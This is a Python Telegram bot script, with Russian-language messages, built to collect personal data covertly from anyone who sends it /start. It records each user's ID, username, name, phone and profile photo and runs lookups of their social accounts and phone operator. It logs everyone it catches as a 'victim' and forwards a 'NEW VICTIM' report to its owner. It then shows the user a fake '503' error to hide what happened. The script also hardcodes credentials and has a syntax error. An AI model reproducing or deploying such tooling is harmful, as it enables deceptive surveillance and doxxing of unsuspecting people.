from telethon import TelegramClient, events
from datetime import datetime
import json
import os
import requests
import re

API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

victims = []

if os.path.exists("victims.json"):
    with open("victims.json", "r") as f:
        victims = json.load(f)

def search_by_username(username):
    results = {}
    sites = {
        "Instagram": f"https://www.instagram.com/{username}/",
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "VK": f"https://vk.com/{username}",
        "YouTube": f"https://youtube.com/@{username}"
    }
    for name, url in sites.items():
        try:
            r = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                results[name] = url
        except:
            pass
    return results

def search_by_phone(phone):
    results = {}
    phone_clean = re.sub(r"\D", "", phone)
    if len(phone_clean) == 11 and phone_clean.startswith("8"):
        phone_clean = "7" + phone_clean[1:]
    try:
        r = requests.get(f"https://htmlweb.ru/geo/api.php?json&tel={phone_clean}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            results["operator"] = data.get("operator", {}).get("name")
            results("region") = data.get("region", {}).get("name")
    except:
        pass
    return results

def save_victim(user, osint_data):
    data = {
        "id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "phone": str(getattr(user, 'phone', 'Скрыт')),
        "osint": osint_data,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    victims.append(data)
    with open("victims.json", "w", encoding="utf-8") as f:
        json.dump(victims, f, indent=2, ensure_ascii=False)

@client.on(events.NewMessage(pattern='/start'))
async def handler(event):
    user = await event.get_sender()
    
    if user.id == OWNER_ID:
        await event.reply("✅ БОТ АКТИВЕН\n\n/stats - статистика\n/list - список жертв\n/help - помощь")
        return
    
    osint_data = {}
    msg_text = event.raw_text
    
    if msg_text.startswith("/start "):
        query = msg_text[7:].strip()
        if query.startswith("+"):
            osint_data = search_by_phone(query)
        elif query.startswith("@"):
            osint_data = search_by_username(query[1:])
        else:
            osint_data = search_by_username(query)
    
    save_victim(user, osint_data)
    
    report = f"""【НОВАЯ ЖЕРТВА】
ID: {user.id}
Username: @{user.username}
Имя: {user.first_name} {user.last_name}
Телефон: {getattr(user, 'phone', 'Скрыт')}
Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}

【OSINT ПРОБИВ】
{json.dumps(osint_data, indent=2, ensure_ascii=False)}

Ссылка: tg://user?id={user.id}"""
    
    await client.send_message(OWNER_ID, report)
    
    try:
        photos = await client.get_profile_photos(user.id, limit=1)
        if photos:
            await client.send_file(OWNER_ID, photos[0], caption=f"@{user.username}")
    except:
        pass
    
    await event.reply("⚠️ Ошибка 503. Сервис недоступен.")

@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    await event.reply(f"Жертв: {len(victims)}")

@client.on(events.NewMessage(pattern='/list', from_users=OWNER_ID))
async def list_cmd(event):
    if not victims:
        await event.reply("Список пуст")
        return
    text = "Жертвы:\n"
    for v in victims[-10:]:
        text += f"- {v['first_name']} @{v['username']} | {v.get('osint', {})}\n"
    await event.reply(text)

@client.on(events.NewMessage(pattern='/help', from_users=OWNER_ID))
async def help_cmd(event):
    await event.reply("/start @username - пробив по юзернейму\n/start +79991234567 - пробив по номеру")

print("Бот запущен")
client.run_until_disconnected()
